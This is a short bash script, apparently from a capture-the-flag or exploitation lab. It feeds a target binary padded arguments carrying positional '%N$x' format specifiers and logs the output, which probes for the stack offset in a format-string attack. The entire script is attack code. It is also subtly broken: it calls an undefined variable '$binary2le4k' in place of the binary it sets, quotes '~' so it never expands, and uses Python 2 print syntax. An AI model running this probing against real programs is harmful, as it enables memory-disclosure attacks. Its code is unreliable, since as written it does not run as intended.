#! /bin/bash

binary='~/binary2le4k'
args=''
rm /tmp/file
for i in {0..900}
do
    arg=$(python -c "print 'A' * 4 + 'B' * 4 + 'C' * 40 + '%$i\$x' + 'c' * 4")
    echo -n "$i " >> /tmp/file
    $binary2le4k $arg $args 2>>/tmp/file 1>&2
    echo '' >> /tmp/file
done

exit 0
